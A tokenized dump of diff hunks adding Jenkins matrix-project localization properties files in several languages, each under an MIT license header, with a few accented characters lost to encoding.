",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixBuild", ".", "depends_on_this", "=", "{", "0", "}", "depends", "on", "this", ".", "MatrixProject", ".", "DisplayName", "=", "Build", "multi", "-", "configuration", "project", "MatrixProject", ".", "Pronoun", "=", "Multi", "-", "configuration", "project", "MatrixProject", ".", "DuplicateAxisName", "=", "Duplicate", "axis", "name", "MatrixBuild", ".", "Triggering", "=", "Triggering", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "appears", "to", "be", "cancelled", "MatrixBuild", ".", "Cancelled", "=", "Cancelled", "{", "0", "}", "MatrixBuild", ".", "Interrupting", "=", "Interrupting", "{", "0", "}", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "completed", "with", "result", "{", "1", "}", "MatrixConfiguration", ".", "Pronoun", "=", "Configuration", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Kept", "because", "{", "0", "}", "is", "kept", "JDKAxis", ".", "DisplayName", "=", "JDK", "LabelAxis", ".", "DisplayName", "=", "Slaves", "LabelExpAxis", ".", "DisplayName", "=", "Label", "expression", "TextArea", ".", "DisplayName", "=", "User", "-", "defined", "Axis", "@", "@", "-", "1", ",", "33", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Gemt", "da", "{", "0", "}", "er", "gemt", "TextArea", ".", "DisplayName", "=", "Brugerdefineret", "akse", "MatrixProject", ".", "DuplicateAxisName", "=", "Dupliker", "akse", "navn", "MatrixBuild", ".", "Triggering", "=", "Starter", "{", "0", "}", "LabelAxis", ".", "DisplayName", "=", "Slaver", "JDKAxis", ".", "DisplayName", "=", "JDK", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "ser", "ud", "til", "at", "v", "\\", "u00e6re", "aflyst", "MatrixConfiguration", ".", "Pronoun", "=", "Konfiguration", "MatrixProject", ".", "DisplayName", "=", "Byg", "multi", "-", "konfigurationsprojekt", "MatrixBuild", ".", "Cancelled", "=", "Aflyst", "{", "0", "}", "MatrixBuild", ".", "Interrupting", "=", "Afbryder", "{", "0", "}", "@", "@", "-", "1", ",", "40", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Simon", "Wiest", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "Multikonfigurationsprojekt", "bauen", "MatrixProject", ".", "Pronoun", "=", "Multikonfigurationsprojekt", "MatrixProject", ".", "DuplicateAxisName", "=", "Name", "der", "Achse", "existiert", "bereits", "MatrixBuild", ".", "Triggering", "=", "L", "\ufffd", "se", "{", "0", "}", "aus", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "scheint", "abgebrochen", "worden", "zu", "sein", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "abgebrochen", "MatrixBuild", ".", "Interrupting", "=", "Unterbreche", "{", "0", "}", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "beendet", "mit", "Ergebnis", "{", "1", "}", "MatrixConfiguration", ".", "Pronoun", "=", "Einstellungen", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Zur", "\ufffd", "ckbehalten", ",", "weil", "{", "0", "}", "zur", "\ufffd", "ckbehalten", "wurde", ".", "LabelExpAxis", ".", "DisplayName", "=", "Labelausdruck", "TextArea", ".", "DisplayName", "=", "Benutzerdefinierte", "Achse", "@", "@", "-", "1", ",", "39", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "Crear", "un", "proyecto", "multi", "-", "configuraci", "\ufffd", "n", "MatrixProject", ".", "DuplicateAxisName", "=", "Duplicar", "el", "nombre", "com", "\ufffd", "n", "MatrixBuild", ".", "Triggering", "=", "Lanzado", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "parece", "haber", "sido", "cancelado", "MatrixBuild", ".", "Cancelled", "=", "Cancelado", "{", "0", "}", "MatrixBuild", ".", "Interrupting", "=", "Abortando", "{", "0", "}", "MatrixConfiguration", ".", "Pronoun", "=", "Configuraci", "\ufffd", "n", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Guardado", "porque", "{", "0", "}", "est", "\ufffd", "guardado", "TextArea", ".", "DisplayName", "=", "Ejes", "definidos", "por", "el", "usuario", "LabelAxis", ".", "DisplayName", "=", "Esclavos", "JDKAxis", ".", "DisplayName", "=", "Jdk", "#", "Label", "expression", "LabelExpAxis", ".", "DisplayName", "=", "Etiqueta", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "se", "ha", "ejecutado", "con", "el", "resultado", "{", "1", "}", "@", "@", "-", "1", ",", "30", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "Construire", "un", "projet", "multi", "-", "configuration", "MatrixBuild", ".", "Triggering", "=", "Lancement", "de", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "semble", "annul", "\ufffd", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "a", "\ufffd", "t", "\ufffd", "annul", "\ufffd", "MatrixBuild", ".", "Interrupting", "=", "{", "0", "}", "en", "cours", "d", "'", "'", "interruption", "MatrixConfiguration", ".", "Pronoun", "=", "Configuration", "@", "@", "-", "1", ",", "40", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2013", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Seiji", "Sogabe", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixBuild", ".", "depends_on_this", "=", "{", "0", "}", "depends", "on", "this", ".", "MatrixProject", ".", "DisplayName", "=", "\\", "u30de", "\\", "u30eb", "\\", "u30c1", "\\", "u69cb", "\\", "u6210", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "\\", "u306e", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "MatrixProject", ".", "Pronoun", "=", "\\", "u30de", "\\", "u30eb", "\\", "u30c1", "\\", "u69cb", "\\", "u6210", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "MatrixProject", ".", "DuplicateAxisName", "=", "\\", "u69cb", "\\", "u6210", "\\", "u8ef8", "\\", "u540d", "\\", "u304c", "\\", "u91cd", "\\", "u8907", "\\", "u3057", "\\", "u3066", "\\", "u3044", "\\", "u307e", "\\", "u3059", "MatrixBuild", ".", "Triggering", "=", "{", "0", "}", "\\", "u306e", "\\", "u8d77", "\\", "u52d5", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "\\", "u306f", "\\", "u4e2d", "\\", "u6b62", "\\", "u3055", "\\", "u308c", "\\", "u305f", "\\", "u3088", "\\", "u3046", "\\", "u3067", "\\", "u3059", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "\\", "u306e", "\\", "u4e2d", "\\", "u6b62", "MatrixBuild", ".", "Interrupting", "=", "{", "0", "}", "\\", "u3078", "\\", "u306e", "\\", "u5272", "\\", "u308a", "\\", "u8fbc", "\\", "u307f", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "\\", "u304c", "\\", "u5b8c", "\\", "u4e86", "\\", "u3057", "\\", "u307e", "\\", "u3057", "\\", "u305f", "\\", "u3002", "\\", "u7d50", "\\", "u679c", ":", "{", "1", "}", "MatrixConfiguration", ".", "Pronoun", "=", "\\", "u8a2d", "\\", "u5b9a", "MatrixRun", ".", "KeptBecauseOfParent", "=", "{", "0", "}", "\\", "u304c", "\\", "u4fdd", "\\", "u7559", "\\", "u4e2d", "\\", "u306e", "\\", "u305f", "\\", "u3081", "\\", "u4fdd", "\\", "u7559", "\\", "u3057", "\\", "u307e", "\\", "u3059", "JDKAxis", ".", "DisplayName", "=", "JDK", "LabelAxis", ".", "DisplayName", "=", "\\", "u30b9", "\\", "u30ec", "\\", "u30fc", "\\", "u30d6", "LabelExpAxis", ".", "DisplayName", "=", "\\", "u30e9", "\\", "u30d9", "\\", "u30eb", "\\", "u5f0f", "TextArea", ".", "DisplayName", "=", "\\", "u30e6", "\\", "u30fc", "\\", "u30b6", "\\", "u5b9a", "\\", "u7fa9", "@", "@", "-", "1", ",", "31", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "sorokh", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixProject", ".", "DisplayName", "=", "Bouw", "een", "multi", "-", "configuratie", "project", "MatrixBuild", ".", "Triggering", "=", "Starten", "van", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "blijkt", "geannuleerd", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "werd", "geannuleerd", "MatrixBuild", ".", "Interrupting", "=", "{", "0", "}", "wordt", "onderbroken", "MatrixConfiguration", ".", "Pronoun", "=", "Configuratie", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Bijgehouden", "omdat", "{", "0", "}", "werd", "bijgehouden", "@", "@", "-", "1", ",", "40", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "completado", "com", "resultado", "{", "1", "}", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Mantido", "porque", "{", "0", "}", "ser", "\\", "u00e1", "mantido", "TextArea", ".", "DisplayName", "=", "Eixo", "definido", "pelo", "usu", "\\", "u00e1rio", "MatrixProject", ".", "DuplicateAxisName", "=", "Nome", "do", "eixo", "duplicado", "MatrixBuild", ".", "Triggering", "=", "Disparando", "{", "0", "}", "LabelAxis", ".", "DisplayName", "=", "Slaves", "JDKAxis", ".", "DisplayName", "=", "JDK", "MatrixBuild", ".", "Interrupting", "=", "Interrompendo", "{", "0", "}", "MatrixBuild", ".", "depends_on_this", "=", "{", "0", "}", "depended", "disso", ".", "LabelExpAxis", ".", "DisplayName", "=", "Label", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "parece", "estar", "cancelado", "MatrixConfiguration", ".", "Pronoun", "=", "Configura", "\\", "u00e7", "\\", "u00e3o", "MatrixProject", ".", "Pronoun", "=", "Projeto", "com", "multi", "-", "configura", "\\", "u00e7", "\\", "u00f5es", "MatrixProject", ".", "DisplayName", "=", "Construir", "Build", "projeto", "com", "multi", "-", "configura", "\\", "u00e7", "\\", "u00f5es", "MatrixBuild", ".", "Cancelled", "=", "{", "0", "}", "cancelado", "@", "@", "-", "1", ",", "42", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Reginaldo", "L", ".", "Russinholi", ",", "Cleiber", "Silva", ",", "#", "Bruno", "Meneguello", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "MatrixBuild", ".", "depends_on_this", "=", "{", "0", "}", "depende", "deste", ".", "MatrixProject", ".", "DisplayName", "=", "Construir", "projeto", "de", "m", "\\", "u00faltiplas", "configura", "\\", "u00e7", "\\", "u00f5es", "MatrixProject", ".", "Pronoun", "=", "Projeto", "de", "M", "\\", "u00faltiplas", "Configura", "\\", "u00e7", "\\", "u00f5es", "MatrixBuild", ".", "Triggering", "=", "Disparando", "{", "0", "}", "MatrixBuild", ".", "AppearsCancelled", "=", "{", "0", "}", "parece", "estar", "cancelado", "MatrixBuild", ".", "Cancelled", "=", "Cancelado", "{", "0", "}", "MatrixBuild", ".", "Interrupting", "=", "Interrompendo", "{", "0", "}", "MatrixBuild", ".", "Completed", "=", "{", "0", "}", "completado", "com", "o", "resultado", "{", "1", "}", "MatrixConfiguration", ".", "Pronoun", "=", "Configura", "\\", "u00e7", "\\", "u00e3o", "MatrixRun", ".", "KeptBecauseOfParent", "=", "Mantido", "porque", "{", "0", "}", "est", "\\", "u00e1", "mantido", "MatrixProject", ".", "DuplicateAxisName", "=", "Duplicar", "nome", "do", "eixo", "JDKAxis", ".", "DisplayName", "=", "JDK", "LabelAxis", ".", "DisplayName", "=", "Slaves", "LabelExpAxis", ".", "DisplayName", "=", "Express", "\\", "u00e7o", "de", "R", "\\", "u00f3tulo", "TextArea", ".", "DisplayName", "=", "Eixo", 